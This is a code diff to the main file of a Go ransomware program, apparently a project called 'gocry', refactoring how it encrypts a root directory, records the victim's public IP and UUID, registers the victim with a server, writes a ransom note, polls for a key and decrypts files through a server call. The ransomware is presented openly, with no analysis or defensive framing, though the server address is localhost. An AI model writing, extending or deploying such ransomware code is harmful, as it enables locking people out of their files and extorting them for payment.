@@ -2,10 +2,8 @@ package main
 
 import (
 	"bufio"
-	"bytes"
 	"io/ioutil"
 	"log"
-	"net/http"
 	"os"
 	"strings"
 	"time"
@@ -13,7 +11,6 @@ import (
 	"github.com/nireo/gocry/crypt"
 	"github.com/nireo/gocry/ransomware"
 	"github.com/nireo/gocry/victim"
-	uuid "github.com/satori/go.uuid"
 	"golang.org/x/exp/errors/fmt"
 )
 
@@ -36,15 +33,8 @@ func main() {
 	crypt.EncryptRoot(rw.RootDir, rw.Key)
 	rw.WriteKeyFile()
 
-	uindef, err := uuid.NewV4()
-	if err != nil {
-		log.Fatalf("error creating an unique indentifier: %s", err)
-	}
-
-	victimIndentifier := victim.NewVictimIndentifer()
-	victimIndentifier.IP = "127.0.0.1"
-	victimIndentifier.SendToServer("http://localhost:8080/register")
-
+	rw.Data.GetPublicIP()
+	rw.Data.SendToServer("http://localhost:8080/register")
 	rw.CreateRansomInfoFile(message)
 
 	// Start an infnite loop which checks key validity. We start in a goroutine, since
@@ -53,30 +43,20 @@ func main() {
 		for {
 			fmt.Println()
 			fmt.Println("Checking key file...")
-			key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
-			if err != nil {
-				time.Sleep(time.Minute * 3)
-				continue
-			}
 
-			// check if the keys match
-			if bytes.Equal(key, rw.Key) {
-				// The ransom has been paid so decrypt the files..
+			if ok := rw.CheckIfValidKey(); ok {
 				crypt.DecryptRoot(rw.RootDir, rw.Key)
 				fmt.Println("Thank you for your cooperation!")
 
-				// remove the key and the ransom files.
-				if err := os.Remove(rw.RootDir + "/key.txt"); err != nil {
-					log.Fatalf("error removing key file: %s", err)
-				}
+				// remove the generated files
+				rw.RemoveRansomFile()
+				rw.RemoveKeyFile()
 
-				if err := os.Remove(rw.RootDir + "/ransom.txt"); err != nil {
-					log.Fatalf("error removing ransom file: %s", err)
-				}
-				break
+				// Stop the whole program
+				os.Exit(0)
 			}
-			fmt.Println("Key did not match, checking again in 3 minutes...")
 
+			fmt.Println("Key did not match, checking again in 3 minutes...")
 			time.Sleep(time.Minute * 3)
 		}
 	}()
@@ -94,8 +74,9 @@ func main() {
 		if text == "commands" {
 			fmt.Println("'commands' - displays all of the commands available.")
 			fmt.Println("'uuid' - display your unique indentifer used to pay your ransomware.")
+			fmt.Println("'decrypt' - decrypts all the encrypted files only if the key.txt containst the right key.")
 		} else if text == "uuid" {
-			fmt.Println(uindef)
+			fmt.Println(rw.Data.UUID)
 		} else if text == "decrypt" {
 			// send the key to the database and get the decrypted key using the private rsa key from the server.
 			key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
@@ -103,29 +84,18 @@ func main() {
 				log.Fatalf("error reading key file: %s", err)
 			}
 
-			req, err := http.NewRequest("POST", "http://localhost:8080/decrypt_key", bytes.NewBuffer(key))
+			decryptedKey, err := victim.GetKeyFromServer(key)
 			if err != nil {
-				log.Fatalf("error with decrypt request: %s", err)
+				fmt.Println("error decrypting key from server...")
+				continue
 			}
 
-			cl := http.Client{}
-			res, err := cl.Do(req)
-			if err != nil {
-				log.Fatalf("error getting decrypt key")
-			}
-			defer res.Body.Close()
-
-			deckey, err := ioutil.ReadAll(res.Body)
-			if err != nil {
-				log.Fatalf("error reading decrypted key: %s", err)
+			if err := rw.RemoveKeyFile(); err != nil {
+				fmt.Println("error removing old key file...")
+				continue
 			}
 
-			// remove the old key file
-			if err := os.Remove(rw.RootDir + "/key.txt"); err != nil {
-				log.Fatalf("error removing old key file: %s", err)
-			}
-
-			if err := ioutil.WriteFile(rw.RootDir+"/key.txt", deckey, 0600); err != nil {
+			if err := ioutil.WriteFile(rw.RootDir+"/key.txt", decryptedKey, 0600); err != nil {
 				log.Fatalf("write output: %s", err)
 			}
 		}
